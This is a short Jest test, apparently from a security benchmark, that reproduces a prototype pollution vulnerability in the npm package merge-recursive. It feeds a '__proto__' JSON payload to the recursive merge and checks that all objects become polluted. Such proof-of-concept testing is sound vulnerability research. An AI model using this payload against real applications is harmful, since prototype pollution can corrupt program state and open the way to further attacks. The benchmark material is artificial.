//https://snyk.io/vuln/SNYK-JS-PROTOTYPEDJS-1069824
test("prototype pollution in merge-recursive", () => {
  const merge = require("merge-recursive").recursive;
  const malicious_payload = process.env.SECBENCH_PAYLOAD || (process.env.SECBENCH_PAYLOAD || '{"__proto__":{"polluted":"yes"}}');
  obj = {};

  expect({}.polluted).toBe(undefined);

  merge({}, JSON.parse(malicious_payload));

  expect({}.polluted).toBe("yes");
});
